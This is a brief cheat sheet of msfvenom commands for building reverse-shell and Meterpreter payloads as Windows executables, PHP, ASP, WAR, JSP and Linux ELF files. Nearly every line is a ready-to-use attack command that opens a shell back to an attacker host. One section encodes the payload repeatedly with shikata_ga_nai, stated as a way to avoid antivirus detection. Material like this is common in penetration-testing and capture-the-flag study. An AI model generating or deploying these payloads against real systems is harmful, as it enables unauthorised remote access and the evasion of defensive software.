# Metasploit Revershell CheatSheet
```sh
Msfvenom: 
msfvenom -p windows/shell_reverse_tcp LHOST=<your ip> LPORT=<your port> -f exe -o shell_reverse.exe
```
## To avoid AV detection, use encryption
```sh
msfvenom -p windows/shell_reverse_tcp LHOST=<your ip> LPORT=<your port> -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe
```

## php
```sh
msfvenom -p php/meterpreter_reverse_tcp LHOST=<your ip> LPORT=<your port> -f raw > shell.php
```

## ASP
```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your ip> LPORT=<your port> -f asp > shell.asp
```

## War
```sh
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your ip> LPORT=<your port> -f war > shell.war
```

## JSP
```sh
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your ip> LPORT=<your port> -f raw > shell.jsp

```

## Binary
```sh
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=443 -f elf > shell.elf
```

## List linux meterpreter payloads
```sh
msfvenom --list | grep xxxx
```

## Send linux shell to meterpreter
```sh
msfvenom -p linux/x64/meterpreter/reverse_tcp lhost= lport= -f elf -o msf.bin (set multi handler then)
```
